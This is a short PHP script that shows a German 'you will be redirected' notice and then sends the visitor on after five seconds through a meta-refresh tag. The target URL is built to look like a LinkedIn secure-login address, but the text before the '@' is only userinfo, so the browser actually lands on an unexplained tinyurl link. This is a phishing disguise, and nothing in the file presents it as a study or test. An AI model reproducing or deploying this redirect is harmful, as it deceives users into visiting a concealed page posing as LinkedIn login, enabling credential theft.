<?php
// Redirection avec un délai de 5 secondes
$redirect_url = "https://linkedin.com+accounts=securelogin+settings=private@tinyurl.com/2aazp3c5";

// Afficher la page avec la balise de redirection côté client
echo "<meta http-equiv='refresh' content='5;url=$redirect_url'>";

// Vous pouvez également afficher un message pendant le délai d'attente
echo "Sie werden umgeleitet zu in 5 Sekunden. Wenn die Weiterleitung nicht funktioniert, klicken Sie bitte";
?>
